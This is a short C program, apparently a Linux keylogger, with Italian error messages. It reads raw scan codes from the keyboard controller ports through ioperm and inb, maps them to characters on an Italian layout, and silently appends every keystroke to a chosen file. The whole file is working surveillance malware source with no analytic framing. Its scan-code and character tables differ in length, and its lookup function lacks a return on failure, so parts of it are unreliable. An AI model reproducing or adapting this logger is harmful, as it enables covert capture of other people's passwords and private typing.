#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/io.h>

#define KB_IO 0X60
#define KB_ST 0x64
#define SLEEP 50
        char key(int code) {
                int i;
                int ascii_code[] = {
                11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30,
                31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50,
                51, 52, 53, 57};
                int ascii_char[] = {
                '0', '\'', 'ì', '\b', '\t', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'è',
                '+', '\n', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'ò', 'à', '<', 'ù', 'z',
                'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '-', ' '};
                for (i = 0; i < 42; i++) {
                        if (code == ascii_code[i])
                                return ascii_char[i];
                }
        }
        int main(int argc, char **argv) {
                int code = 0;
                int last = 0;
                FILE *file;
                if (!argv[1]) {
                        fprintf(stderr, "%s <file>\n", argv[0]);
                        exit(1);
                }
                if (!(file = fopen(argv[1], "a"))) {
                        fprintf(stderr, "Impossibile scrivere sul file %s\n", argv[1]);
                        exit(2);
                }
                if (ioperm(KB_IO, 1, 1) == -1 || ioperm(KB_ST, 1, 1) == -1) {
                        fprintf(stderr, "Impossibile accedere alla porta di I/O della tastiera\n");
                        exit(3);                }
                while (1) {
                        code = 0;
                        if (inb(KB_ST) == 20)
                                code = inb(KB_IO);
                        if (code) {
                                if (code != last) {
                                        last = code;
                                        if (key(code)) {
                                                fprintf(file, "%c", key(code));
                                                fflush(file);
                                        }
                                }
                        }
                        usleep(SLEEP);
                }
                return 0;
  }


